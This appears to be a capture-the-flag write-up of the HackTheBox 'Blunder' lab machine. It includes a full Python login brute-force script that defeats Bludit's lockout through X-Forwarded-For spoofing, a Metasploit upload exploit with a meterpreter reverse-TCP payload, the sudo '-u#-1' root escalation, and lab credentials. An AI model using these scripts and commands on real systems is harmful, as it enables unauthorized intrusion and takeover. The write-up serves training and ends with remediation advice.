+++
draft = false
date = 2020-07-04T16:04:02+01:00
title = "Blunder"
description = ""
slug = ""
tags = []
categories = []
externalLink = ""
series = []
weight = 10
+++


# Machine info

- OS : Linux
- Difficulty : Easy
- Points : 20
- IP : 10.10.10.191


# Mind Map
![Blunder_MindMap](/images/htb/blunder_mindmap.png)


# Reconnaisance

Initial scan:

{{< highlight html >}}
sudo nmap -sC -sV -n 10.10.10.191 -oA nmap/initial

Nmap scan report for 10.10.10.191
Host is up (0.077s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
{{< /highlight >}}

Only **port 80** is open. Visiting the page I can see that it is a simple blog. With  a combination of the `WhatWeb`command and a qiuck look at the page source code I'm able to identify the blog service name and its version:

{{< highlight html >}}
whatweb http://10.10.10.191
http://10.10.10.191 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.191], JQuery, MetaGenerator[Blunder], Script, Title[Blunder | A blunder of interesting facts], X-Powered-By[Bludit]
{{< /highlight >}}

**Note:**
> WhatWeb identifies websites. Its goal is to answer the question, “What is that Website?”. WhatWeb recognises web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices. WhatWeb has over 1700 plugins, each to recognise something different. WhatWeb also identifies version numbers, email addresses, account IDs, web framework modules, SQL errors, and more.


Source code:

![Bludit_Version](/images/htb/bludit_version.png)

**->** So I can conclude that the CMS in use is **Bludit version 3.9.2**.

This particular version is vulnerable to **CVE-2019-16113** and allows remote code execution via `bl-kernel/ajax/upload-images.ph` and PHP code can be entered with a `.jpg` file name. But for the moment, I'm not able to upload any file as I don't have an access point to the app!

# Enumeration

At this point I proceed enumerating port 80 and searching for some configuration files left available or some directories/files.
For this task I'm using `dirsearch` and `wfuzz`.

{{< highlight html >}}
sudo python3 /opt/dirsearch/dirsearch.py -u http://10.10.10.191 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -r -f -e php,sh,old,bak

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php.sh, old, bak, js, asp, aspx | HTTP method: get | Threads: 10 | Wordlist size: 613521 | Recursion level: 1

Error Log: /opt/dirsearch/logs/errors-20-07-05_10-33-25.log

Target: http://10.10.10.191

[10:33:25] Starting:
[10:33:46] 403 -  277B  - /icons/         
[10:34:38] 200 -    2KB - /admin/  
.....          
{{< /highlight >}}            

I discovered a login page under `/admin`:

![Bludit_LoginPage](/images/htb/bludit_login_page.png)

**Note**: I will not try to bruteforce the login before having a valid username because the `Bludit` service webpage states clearly that there is a system blocking login brute force attempts.

With `wfuzz` I'm searching for some configuration or text files left available by the developers:

{{< highlight html >}}
wfuzz -c -w /opt/SecLists/Discovery/Web-Content/common.txt --hc 404,403 -u "http://10.10.10.191/FUZZ.txt" -t 100

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.191/FUZZ.txt
Total requests: 4655

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                      
===================================================================

000003516:   200        1 L      4 W      22 Ch       "robots"                                                                                                     
000004122:   200        4 L      23 W     118 Ch      "todo"                                                                                                       

Total time: 130.1939
Processed Requests: 4655
Filtered Requests: 4653                                                                                                                                                       
Requests/sec.: 35.75433  
{{< /highlight >}}  

Where:
- `-c` renders the output with colors
- `-w` specifies the wordlist
- `--hc` hide the responses with the specified code, `403` and `404` in this case
- `-u` is the url to fuzz
- `-t` specifies the number of concurrent connections

Let's visit `/todo.txt`:

![Bludit_ToDo](/images/htb/bludit_todo.png)

**Note**: **fergus** could be a valid username for the login page!

# Exploitation

At this point, doing some research on the service, I know that there is a method to bypass the brute force security service.
Reference -> https://rastating.github.io/bludit-brute-force-mitigation-bypass/

I edit the code a bit to fit my purpose:

{{< highlight python >}}
#!/usr/bin/env python3
import re
import requests

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
pass_file = "/home/user/Desktop/HackTheBox/Blunder/pass_file.txt"

with open(pass_file) as w:
    content = w.readlines()
    result = [x.strip() for x in content]
wordlist = result


for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
{{< /highlight >}}

Where the `pass_file` is a wordlist obtained with `cewl`:

> CeWL is a ruby app which spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper.

{{< highlight html >}}
cewl -w wordlists.txt -d 10 -m 1 http://10.10.10.191
{{< /highlight >}}

Where:
- `-w` is the output file where to write
- `-d` is the spider depth
- `-m` is the minimum word length

Launching the script I'm able to find a valid password for the `fergus` user!

{{< highlight html >}}
python3 bruteforce.py
...
...
SUCCESS: Password found!
Use fergus:RolandDeschain to login.
{{< /highlight >}}

As stated before, this version of Bludit is vulnerable to a `Directory Traversal Image File Upload Vulnerability`, for which there is a Metasploit module available!

{{< highlight html >}}
msf5 exploit(linux/http/bludit_upload_images_exec) > show options

Module options (exploit/linux/http/bludit_upload_images_exec):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   BLUDITPASS  RolandDeschain   yes       The password for Bludit
   BLUDITUSER  fergus           yes       The username for Bludit
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      10.10.10.191     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The base path for Bludit
   VHOST                        no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.4       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Bludit v3.9.2
{{< /highlight >}}

After running the exploit, I'm able to get a shell as the `www-data` user!

{{< highlight html >}}
meterpreter > getuid
Server username: www-data (33)
{{< /highlight >}}

# Privilege Escalation

Let's spawn a python shell:

{{< highlight html >}}
meterpreter > shell
Process 3656 created.
Channel 0 created.
python -c 'import pty;pty.spawn("/bin/bash");'
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$
{{< /highlight >}}

Visiting the home page under `/home` I can see that there are home folders for two users, `hugo` and `shaun`.

**->** I'm able to find the password for the `hugo` user under:

 `/var/www/bludit-3.10.0a/bl-content/databases/users.php`.

**Note**: I can switch to user `hugo` with the `su hugo` command!

Can I run any command with  root privileges with that user?

{{< highlight html >}}
ugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -l
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
{{< /highlight >}}

The answer is yes, any command except for `/bin/bash`!

This kind of configuration of the sudoers file is known to be vulnerable to **CVE : 2019-14287**

All I need to do to obtain root here is:

{{< highlight html >}}
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -u#-1 /bin/bash

root@blunder:/var/www/bludit-3.10.0a/bl-content/databases# id
id
uid=0(root) gid=1001(hugo) groups=1001(hugo)
{{< /highlight >}}

**Note**: flags are under `/home/hugo` and `/root`!

## Lessons learned and remediations

- The blog was not patched against the public known vulnerability for **Bludit version 3.9.2**. The administrator should have upgraded the service to a more secure version.
- Thanks to the `todo.txt` file left on the server by the developers I was able to retrieve a valid user and bruteforce the login. This should not happen and all the sensible configuration files and notes should be stored in a safe place.
- There are always different ways to do things. Tools are here for our advantage but it is really important to understand what we're doing before launching random attacks. In this case `dirsearch` and `wfuzz` were both indispensable to find our way in, but I could have found the same results using only one of them. Also, `cewl` was very useful because the login password was not present in the common wordlists I'm using.
